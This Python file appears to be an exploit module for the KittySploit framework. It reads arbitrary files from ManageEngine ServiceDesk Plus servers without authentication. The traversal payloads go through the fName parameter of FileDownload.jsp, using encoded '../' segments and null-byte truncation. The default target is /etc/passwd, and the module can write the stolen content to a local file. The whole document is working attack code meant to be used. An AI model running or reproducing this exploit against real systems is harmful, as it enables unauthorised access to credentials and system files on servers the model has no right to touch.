#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ManageEngine ServiceDesk Plus FileDownload.jsp fName file read."""

from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'ManageEngine SDP - FileDownload.jsp fName File Read',
        'description': (
            'Reads arbitrary files via ManageEngine ServiceDesk Plus FileDownload.jsp '
            'fName path traversal with null-byte truncation.'
        ),
        'author': ['KittySploit Team'],
        'platform': Platform.MULTI,
        'references': [
            'https://www.manageengine.com/products/service-desk/',
        ],
        'tags': ['manageengine', 'sdp', 'lfi', 'file-read', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'suggested_followups': ['scanner/http/manageengine_sdp_filedownload_lfi_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)
    base_path = OptString('', 'ServiceDesk base path (empty = auto)', required=False, advanced=True)
    traversal_depth = OptInteger(5, 'Number of ../ segments', required=False, advanced=True)

    def _bases(self) -> list[str]:
        base = str(self.base_path or '').strip().rstrip('/')
        if base:
            return [base]
        return ['', '/sdp', '/ServiceDesk']

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        depth = max(1, int(self.traversal_depth or 5))
        fname = ('..%2f' * depth) + quote(remote, safe='') + '%00'
        for base in self._bases():
            path = f'{base}/workorder/FileDownload.jsp?module=support&fName={fname}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and (r.text or ''):
                return r.text or ''
        return ''

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via FileDownload.jsp fName ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
